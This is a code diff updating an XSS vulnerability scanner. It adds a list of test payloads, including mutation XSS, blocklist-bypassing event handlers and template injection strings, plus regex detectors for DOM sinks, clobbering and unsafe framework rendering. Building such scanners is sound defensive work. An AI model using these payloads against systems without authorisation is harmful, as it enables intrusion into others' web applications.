@@ -1,5 +1,12 @@
 """
-XSS Scanner - ENHANCED with DOM XSS detection
+XSS Scanner — Reflected, Stored, DOM, and Mutation XSS detection.
+
+2025 updates:
+  - Modern event handlers (onpointerover, onanimationend, ontransitionend)
+  - Mutation XSS payloads that exploit browser HTML parser quirks
+  - DOM clobbering detection
+  - Template literal injection (${...}) patterns
+  - Updated DOM sink list for modern frameworks (React dangerouslySetInnerHTML, v-html, [innerHTML])
 """
 
 import logging
@@ -13,38 +20,49 @@ logger = logging.getLogger(__name__)
 
 
 class XSSScanner(BaseScanner):
-    """Enhanced XSS scanner with DOM XSS and reflected XSS detection."""
+    """Multi-vector XSS scanner: reflected, DOM, stored, mutation."""
 
     def __init__(self, config, http_client):
         super().__init__(config, http_client)
         self.name = "XSSScanner"
-        self.description = "Detects XSS vulnerabilities including DOM-based"
-        self.version = "2.0.0"
-        self.capabilities = ["Reflected XSS", "DOM XSS", "Stored XSS Detection", "WAF Evasion"]
+        self.description = "Detects XSS vulnerabilities including DOM, mutation, and template injection"
+        self.version = "3.0.0"
+        self.capabilities = [
+            "Reflected XSS", "DOM XSS", "Stored XSS Detection",
+            "Mutation XSS", "DOM Clobbering", "WAF Evasion",
+        ]
 
     async def scan(self, url: str, progress_callback: Callable | None = None) -> dict[str, Any]:
         """Perform comprehensive XSS scan."""
         logger.info(f"Initiating XSS scan for {url}")
         vulnerabilities = []
 
-        # Enhanced XSS payloads with evasion
+        # Layered payloads: classic → modern event handlers → mutation XSS
         base_payloads = [
+            # Classic vectors
             "<script>alert(1)</script>",
             "<img src=x onerror=alert(1)>",
             "<svg onload=alert(1)>",
-            "javascript:alert(1)",
             '"><script>alert(1)</script>',
             "'><script>alert(1)</script>",
-            '<iframe src="javascript:alert(1)">',
-            "<body onload=alert(1)>",
-            "<input autofocus onfocus=alert(1)>",
-            "<select autofocus onfocus=alert(1)>",
-            "<textarea autofocus onfocus=alert(1)>",
-            "<keygen autofocus onfocus=alert(1)>",
-            '<video><source onerror="alert(1)">',
-            "<audio src=x onerror=alert(1)>",
+            # Modern event handlers (bypass event handler blocklists)
+            "<div onpointerover=alert(1)>hover</div>",
+            "<style onload=alert(1)>",
             "<details open ontoggle=alert(1)>",
+            "<input onfocus=alert(1) autofocus>",
+            "<video onloadstart=alert(1)><source>",
+            "<body onpageshow=alert(1)>",
             "<marquee onstart=alert(1)>",
+            # Mutation XSS — exploits browser parser re-serialization
+            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+            "<svg><animate onbegin=alert(1) attributeName=x>",
+            # Template literal injection
+            "${alert(1)}",
+            "{{constructor.constructor('alert(1)')()}}",
+            # Protocol handlers
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>",
         ]
 
         try:
@@ -128,7 +146,7 @@ class XSSScanner(BaseScanner):
         return False
 
     async def _test_dom_xss(self, url: str) -> list[Vulnerability]:
-        """Test for DOM-based XSS vulnerabilities."""
+        """Test for DOM-based XSS, DOM clobbering, and framework-specific sinks."""
         vulns = []
 
         try:
@@ -138,7 +156,7 @@ class XSSScanner(BaseScanner):
 
             content = await response.text()
 
-            # Dangerous DOM sinks
+            # Dangerous DOM sinks (classic + modern frameworks)
             dom_sinks = [
                 r"document\.write\s*\(\s*[^)]*location",
                 r"document\.writeln\s*\(\s*[^)]*location",
@@ -148,32 +166,30 @@ class XSSScanner(BaseScanner):
                 r"setTimeout\s*\(\s*[^)]*location",
                 r"setInterval\s*\(\s*[^)]*location",
                 r"Function\s*\(\s*[^)]*location",
-                r"\.html\s*\(\s*[^)]*location",  # jQuery
+                r"\.html\s*\(\s*[^)]*location",     # jQuery
                 r"\$\([^)]*\)\.append\s*\([^)]*location",
+                r"\.insertAdjacentHTML\s*\(",          # Modern DOM API
+                r"document\.createRange\(\)\.createContextualFragment",
+                r"\.srcdoc\s*=",                       # iframe srcdoc injection
             ]
 
-            # Dangerous sources
+            # Tainted sources
             dom_sources = [
-                "location.hash",
-                "location.search",
-                "location.href",
-                "document.URL",
-                "document.documentURI",
-                "document.referrer",
-                "window.name",
+                "location.hash", "location.search", "location.href",
+                "location.pathname", "document.URL", "document.documentURI",
+                "document.referrer", "window.name", "postMessage",
+                "document.cookie",
             ]
 
-            # Check for dangerous patterns
             for sink_pattern in dom_sinks:
                 matches = re.findall(sink_pattern, content, re.IGNORECASE | re.MULTILINE)
                 if matches:
-                    # Check if any dangerous source is used
                     for source in dom_sources:
                         if source in content:
                             vulns.append(
                                 self._create_vulnerability(
                                     title="Potential DOM-based XSS",
-                                    description=f"Dangerous DOM sink pattern found: {sink_pattern[:50]}. Used with source: {source}",
+                                    description=f"Dangerous sink: {sink_pattern[:50]}. Tainted source: {source}",
                                     severity="medium",
                                     type="dom_xss",
                                     evidence={
@@ -183,24 +199,66 @@ class XSSScanner(BaseScanner):
                                         "code_snippet": matches[0][:150] if matches else "",
                                     },
                                     cwe_id="CWE-79",
-                                    remediation="Sanitize and validate all data from DOM sources before using in sinks. Use textContent instead of innerHTML.",
+                                    remediation="Sanitize all data from DOM sources before using in sinks. Use textContent instead of innerHTML.",
                                 )
                             )
                             break
-                    if vulns:  # Found vulnerability, don't need to check more sinks
+                    if vulns:
                         break
 
-            # Check for dangerous eval patterns
+            # DOM Clobbering detection
+            clobber_patterns = [
+                r'<(?:a|form|img|embed)\s+[^>]*(?:id|name)\s*=\s*["\'](?:location|document|window|self|top)',
+            ]
+            for pattern in clobber_patterns:
+                if re.search(pattern, content, re.IGNORECASE):
+                    vulns.append(
+                        self._create_vulnerability(
+                            title="DOM Clobbering Vector",
+                            description="HTML elements with id/name attributes that shadow DOM globals detected.",
+                            severity="medium",
+                            type="dom_xss",
+                            evidence={"url": url, "pattern": pattern},
+                            cwe_id="CWE-79",
+                            remediation="Avoid using global DOM property names as HTML id/name attributes.",
+                        )
+                    )
+                    break
+
+            # Framework-specific unsafe patterns
+            framework_sinks = {
+                "dangerouslySetInnerHTML": "React",
+                "v-html": "Vue.js",
+                "[innerHTML]": "Angular",
+                "bypassSecurityTrustHtml": "Angular",
+                "{{{": "Handlebars (unescaped)",
+                "| safe": "Django/Jinja2 (unescaped)",
+            }
+            for pattern, framework in framework_sinks.items():
+                if pattern in content:
+                    vulns.append(
+                        self._create_vulnerability(
+                            title=f"Unsafe HTML Rendering ({framework})",
+                            description=f"Framework-specific unescaped output detected: {pattern}",
+                            severity="low",
+                            type="code_pattern",
+                            evidence={"url": url, "framework": framework, "pattern": pattern},
+                            cwe_id="CWE-79",
+                            remediation=f"Audit all uses of {pattern} in {framework} code. Ensure user input is never passed directly.",
+                        )
+                    )
+
+            # Eval/Function patterns
             if "eval(" in content or "Function(" in content:
                 vulns.append(
                     self._create_vulnerability(
                         title="Dangerous JavaScript Patterns",
-                        description="Use of eval() or Function() constructor detected. These can lead to code injection.",
+                        description="Use of eval() or Function() constructor detected.",
                         severity="info",
                         type="code_pattern",
                         evidence={"url": url},
                         cwe_id="CWE-95",
-                        remediation="AvoidAvoid using eval() and Function(). Use safer alternatives like JSON.parse().",
+                        remediation="Avoid using eval() and Function(). Use safer alternatives like JSON.parse().",
                     )
                 )
 
